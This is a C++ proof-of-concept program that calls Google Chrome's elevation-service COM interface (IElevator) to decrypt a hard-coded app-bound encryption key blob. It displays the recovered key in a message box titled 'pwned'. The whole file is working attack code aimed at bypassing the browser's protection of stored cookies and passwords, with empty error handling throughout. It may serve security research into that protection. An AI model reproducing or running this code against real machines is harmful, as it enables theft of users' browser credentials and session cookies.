﻿#include <iostream>
#include <Windows.h>
#include <wrl/client.h>
#include <comdef.h>
#include <sstream>
#include <iomanip>

typedef
enum ProtectionLevel
{
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3
}     ProtectionLevel;

MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IElevator : public IUnknown
{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(
        /* [string][in] */ const WCHAR * crx_path,
        /* [string][in] */ const WCHAR * browser_appid,
        /* [string][in] */ const WCHAR * browser_version,
        /* [string][in] */ const WCHAR * session_id,
        /* [in] */ DWORD caller_proc_id,
        /* [out] */ ULONG_PTR * proc_handle) = 0;

    virtual HRESULT STDMETHODCALLTYPE EncryptData(
        /* [in] */ ProtectionLevel protection_level,
        /* [in] */ const BSTR plaintext,
        /* [out] */ BSTR* ciphertext,
        /* [out] */ DWORD* last_error) = 0;

    virtual HRESULT STDMETHODCALLTYPE DecryptData(
        /* [in] */ const BSTR ciphertext,
        /* [out] */ BSTR* plaintext,
        /* [out] */ DWORD* last_error) = 0;

};

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    IID  elevator_clsid = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
    IID elevator_iid = { 0x463abecf, 0x410d, 0x407f, {0x8a, 0xf5, 0xd, 0xf3, 0x5a, 0x0, 0x5c, 0xc8} };
    HRESULT hr;
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {}
    Microsoft::WRL::ComPtr<IElevator> elevator;
    hr = CoCreateInstance(elevator_clsid, nullptr, CLSCTX_LOCAL_SERVER, elevator_iid, IID_PPV_ARGS_Helper(&elevator));
    if (FAILED(hr)) {}
    hr = CoSetProxyBlanket
    (
        elevator.Get(),
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        nullptr,
        EOAC_DYNAMIC_CLOAKING
    );
    if (FAILED(hr)) {}
    DWORD lasterror;
    BSTR plaintext;
    const char* appboundkey = "\x01\x00\x00\x00\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8c\x7a\x00\xc0\x4f\xc2\x97\xeb\x01\x00\x00\x00\xc3\x9c\x20\x85\x3a\x4f\xc6\x4d\xb7\x31\xfb\x2c\xe6\xdf\x9e\xb8\x10\x00\x00\x00\x1c\x00\x00\x00\x47\x00\x6f\x00\x6f\x00\x67\x00\x6c\x00\x65\x00\x20\x00\x43\x00\x68\x00\x72\x00\x6f\x00\x6d\x00\x65\x00\x00\x00\x10\x66\x00\x00\x00\x01\x00\x00\x20\x00\x00\x00\x64\x02\xa3\xf3\x0a\xe0\x26\x50\x9b\xfc\xc2\xf0\xc4\x16\x4e\x57\x32\xef\xb2\xbd\x11\xa8\x99\xf1\x59\xc2\xcb\x8c\x3e\x38\xd0\xc6\x00\x00\x00\x00\x0e\x80\x00\x00\x00\x02\x00\x00\x20\x00\x00\x00\x95\x08\x82\x78\xc1\xa8\x54\x16\x08\x1e\xc6\xf3\x09\x1a\xde\x52\xf4\xc0\x03\x0a\xdc\xf2\x40\xaf\xe6\xc1\x33\xff\xa2\xd3\x1f\x4d\x70\x01\x00\x00\x00\x2e\x2b\x6d\x37\x79\xfb\x07\xef\xcc\x6e\x11\xc6\x11\x90\x14\xca\x06\x3c\x83\x15\x80\xbf\x51\xe3\xd9\x9a\x32\x92\x1b\xe1\x40\xd5\xf6\xd2\x2f\x76\xb2\xe9\x76\xe6\x90\x3e\x69\x98\xab\x44\xd7\x15\x6d\x4d\xae\xc2\x77\x95\x0f\xb5\xe7\x9e\xc5\x80\xcc\x17\x6e\x3e\x70\x79\x05\x25\xfd\x41\x73\x39\xee\xdf\x4f\xb0\x6a\x3a\xf7\xf1\x85\x92\xb7\x3b\x5d\x58\x22\x76\x22\x24\x1c\x6c\x94\xb7\xe9\xfa\x2e\x28\xf2\x46\xa4\x59\x99\x01\x08\x05\x37\x6f\x35\x11\xc9\x90\xbb\x3b\xbd\x07\x0a\xd6\x73\x61\x1c\x38\xa1\xb6\x50\x37\xcc\x31\x29\x80\x28\x70\xeb\x3a\xd2\x97\x43\x02\x9e\x30\x22\xfb\x6e\x56\x8c\xf7\xb8\x63\xc6\xf3\x40\x83\x7c\x79\xe7\x23\xcd\xcd\x65\x2a\x80\x7d\x1e\x57\x66\x00\x88\x04\xce\x50\x26\x02\x34\xc6\xa2\x2b\x20\xfb\xbe\x68\xb7\x3f\x6a\x68\xac\x17\x93\xeb\x52\x9d\x6c\xdf\x8c\x22\x98\x83\x81\xc7\x4b\x5d\x1c\x1b\x33\x06\xbd\xe4\x5f\xab\x2e\x64\x6f\x3f\xcd\x65\xd2\xbf\x11\x19\xc4\x07\xe9\x93\x9a\xb2\x3b\xc2\xdf\x52\xb9\xeb\x03\x32\x2e\xf6\x83\x02\x65\x9d\x26\x18\x87\xdb\xfb\xe9\x0e\xc7\x2f\x60\x61\xc7\x0d\x77\xfc\x20\x56\x9f\x28\xe1\x1d\x48\x20\xa2\x80\xbc\x62\x4c\xd6\x06\x8d\xa9\x5b\xfb\x99\x97\x32\x2d\x21\x7d\xb0\xca\x9c\xbf\xd7\x4c\xa0\x8a\xa3\xdb\xc2\x9b\xd7\x7b\x93\xc3\xe4\xcf\x92\x13\xcc\xd1\x2a\xad\xc2\x42\x3a\x8a\x14\x91\x89\xdc\x61\xbd\xd4\x60\xde\x12\x6a\xe8\x33\xd8\xc9\x18\x7c\x6d\xa7\xea\x6d\xd1\x1a\x4f\xd1\x09\x9f\xb7\x43\x36\xfa\xcb\x52\x4c\xa9\x52\xce\x8c\xbf\xbe\xbd\xf9\xf5\xff\x24\x44\xf1\x4b\x3a\x9a\xf3\x48\x9a\xc7\x38\xca\x73\xaa\xb8\x3d\xf6\x40\x00\x00\x00\x67\x5d\x36\x2b\x92\xcc\x33\x01\x73\xd8\xdd\xd1\x27\x36\x4e\x64\x54\x70\x41\x5c\xaa\x27\xbd\xad\xc5\x27\xa0\x80\x88\x01\x5c\x67\x56\x2d\x05\x12\xf7\x91\x10\x52\x83\xc3\x95\x7b\x83\xf5\x40\x38\xcd\x4c\x4f\xc1\x24\x16\x99\x2b\x49\xc4\xf5\xbb\x23\x4e\xe3\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    size_t len = sizeof("\x01\x00\x00\x00\xd0\x8c\x9d\xdf\x01\x15\xd1\x11\x8c\x7a\x00\xc0\x4f\xc2\x97\xeb\x01\x00\x00\x00\xc3\x9c\x20\x85\x3a\x4f\xc6\x4d\xb7\x31\xfb\x2c\xe6\xdf\x9e\xb8\x10\x00\x00\x00\x1c\x00\x00\x00\x47\x00\x6f\x00\x6f\x00\x67\x00\x6c\x00\x65\x00\x20\x00\x43\x00\x68\x00\x72\x00\x6f\x00\x6d\x00\x65\x00\x00\x00\x10\x66\x00\x00\x00\x01\x00\x00\x20\x00\x00\x00\x64\x02\xa3\xf3\x0a\xe0\x26\x50\x9b\xfc\xc2\xf0\xc4\x16\x4e\x57\x32\xef\xb2\xbd\x11\xa8\x99\xf1\x59\xc2\xcb\x8c\x3e\x38\xd0\xc6\x00\x00\x00\x00\x0e\x80\x00\x00\x00\x02\x00\x00\x20\x00\x00\x00\x95\x08\x82\x78\xc1\xa8\x54\x16\x08\x1e\xc6\xf3\x09\x1a\xde\x52\xf4\xc0\x03\x0a\xdc\xf2\x40\xaf\xe6\xc1\x33\xff\xa2\xd3\x1f\x4d\x70\x01\x00\x00\x00\x2e\x2b\x6d\x37\x79\xfb\x07\xef\xcc\x6e\x11\xc6\x11\x90\x14\xca\x06\x3c\x83\x15\x80\xbf\x51\xe3\xd9\x9a\x32\x92\x1b\xe1\x40\xd5\xf6\xd2\x2f\x76\xb2\xe9\x76\xe6\x90\x3e\x69\x98\xab\x44\xd7\x15\x6d\x4d\xae\xc2\x77\x95\x0f\xb5\xe7\x9e\xc5\x80\xcc\x17\x6e\x3e\x70\x79\x05\x25\xfd\x41\x73\x39\xee\xdf\x4f\xb0\x6a\x3a\xf7\xf1\x85\x92\xb7\x3b\x5d\x58\x22\x76\x22\x24\x1c\x6c\x94\xb7\xe9\xfa\x2e\x28\xf2\x46\xa4\x59\x99\x01\x08\x05\x37\x6f\x35\x11\xc9\x90\xbb\x3b\xbd\x07\x0a\xd6\x73\x61\x1c\x38\xa1\xb6\x50\x37\xcc\x31\x29\x80\x28\x70\xeb\x3a\xd2\x97\x43\x02\x9e\x30\x22\xfb\x6e\x56\x8c\xf7\xb8\x63\xc6\xf3\x40\x83\x7c\x79\xe7\x23\xcd\xcd\x65\x2a\x80\x7d\x1e\x57\x66\x00\x88\x04\xce\x50\x26\x02\x34\xc6\xa2\x2b\x20\xfb\xbe\x68\xb7\x3f\x6a\x68\xac\x17\x93\xeb\x52\x9d\x6c\xdf\x8c\x22\x98\x83\x81\xc7\x4b\x5d\x1c\x1b\x33\x06\xbd\xe4\x5f\xab\x2e\x64\x6f\x3f\xcd\x65\xd2\xbf\x11\x19\xc4\x07\xe9\x93\x9a\xb2\x3b\xc2\xdf\x52\xb9\xeb\x03\x32\x2e\xf6\x83\x02\x65\x9d\x26\x18\x87\xdb\xfb\xe9\x0e\xc7\x2f\x60\x61\xc7\x0d\x77\xfc\x20\x56\x9f\x28\xe1\x1d\x48\x20\xa2\x80\xbc\x62\x4c\xd6\x06\x8d\xa9\x5b\xfb\x99\x97\x32\x2d\x21\x7d\xb0\xca\x9c\xbf\xd7\x4c\xa0\x8a\xa3\xdb\xc2\x9b\xd7\x7b\x93\xc3\xe4\xcf\x92\x13\xcc\xd1\x2a\xad\xc2\x42\x3a\x8a\x14\x91\x89\xdc\x61\xbd\xd4\x60\xde\x12\x6a\xe8\x33\xd8\xc9\x18\x7c\x6d\xa7\xea\x6d\xd1\x1a\x4f\xd1\x09\x9f\xb7\x43\x36\xfa\xcb\x52\x4c\xa9\x52\xce\x8c\xbf\xbe\xbd\xf9\xf5\xff\x24\x44\xf1\x4b\x3a\x9a\xf3\x48\x9a\xc7\x38\xca\x73\xaa\xb8\x3d\xf6\x40\x00\x00\x00\x67\x5d\x36\x2b\x92\xcc\x33\x01\x73\xd8\xdd\xd1\x27\x36\x4e\x64\x54\x70\x41\x5c\xaa\x27\xbd\xad\xc5\x27\xa0\x80\x88\x01\x5c\x67\x56\x2d\x05\x12\xf7\x91\x10\x52\x83\xc3\x95\x7b\x83\xf5\x40\x38\xcd\x4c\x4f\xc1\x24\x16\x99\x2b\x49\xc4\xf5\xbb\x23\x4e\xe3\xca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
    BSTR ciphertext = SysAllocStringByteLen(appboundkey, len);
    hr = elevator->DecryptData(ciphertext, &plaintext, &lasterror);
    if (SUCCEEDED(hr)) 
    {
        len = SysStringByteLen(plaintext);
        std::ostringstream text;
        for (size_t i = 0; i < len; ++i)
            text << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(plaintext[i]);
        MessageBoxA(NULL, text.str().c_str(), "pwned", MB_OK);
    }
}